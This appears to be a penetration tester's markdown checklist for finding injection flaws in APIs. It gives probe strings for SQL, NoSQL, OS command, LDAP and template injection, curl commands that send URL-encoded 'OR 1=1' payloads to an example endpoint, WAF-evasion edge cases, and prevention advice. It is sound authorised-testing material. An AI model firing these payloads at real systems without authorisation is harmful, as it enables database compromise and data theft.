# 2019 Batch 04 — API8: Injection (standalone)

> **2023 note:** Not a dedicated Top-10 entry; SQLi often filed under [Security Misconfiguration](../../execution_batches/08-security-misconfiguration.md). Keep **Injection** as its own test class on every API.

## FILL IN

```bash
BASE="https://api.example.com"
EMAIL="user@example.com"; PASS="..."
LOGIN="/api/v1/authentication/.../sign-in"
# Path/query/JSON fields that reach DB/OS/LDAP/template
COUNT="/api/v1/products/{Name}/count"
```

## GOAL
Show user input reaches an **interpreter** (SQL, NoSQL, OS, LDAP, template) unsafely.

## WHY

```text
Client string  →  concatenated into query/command  →  attacker changes meaning
```

| Family | Probes |
|--------|--------|
| SQL | `'`, `"`, `OR 1=1`, time delays |
| NoSQL | `{"$gt":""}`, operator injection |
| OS | `; id`, `|`, backticks on export/tools |
| LDAP | `*)(uid=*` |
| Template | `{{7*7}}`, `${7*7}` |

CWE-89 / CWE-74 / CWE-78 …

## DO THIS

### 1) Map string sinks

Path params (`/{Name}/count`), `filter`, `sort`, `q`, report builders, GraphQL args.

### 2) Baseline → break → boolean

```bash
JWT=$( ... )
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/products/laptop/count"
# encode payload
enc=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"laptop'\", safe=''))")
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/products/${enc}/count"
enc=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"laptop' OR 1=1 --\", safe=''))")
curl -sk -H "Authorization: Bearer $JWT" "$BASE/api/v1/products/${enc}/count"
```

### 3) Confirm impact (RoE)

Tautology count change minimum; deeper extract only if authorized.

### 4) Other interpreters

If endpoint shells out (export, ping, convert): command metacharacters.  
Mongo-style JSON operators on filters.

## EDGE CASES

| # | Test |
|---|------|
| E1 | ORDER BY injection via sort |
| E2 | Second-order (store then use) |
| E3 | JSON body vs path encoding |
| E4 | WAF evasion (comments, case) |
| E5 | Error-based info leak |

## Prevention

Parameterized queries / ORM; allowlists; least-privilege DB; disable stacked queries; input length limits.

## WORKED EXAMPLE (lab)

p12 products count; p13 suppliers count → **151** full table.  
→ `../../notes/inlanefreight-security-misconfig/`.
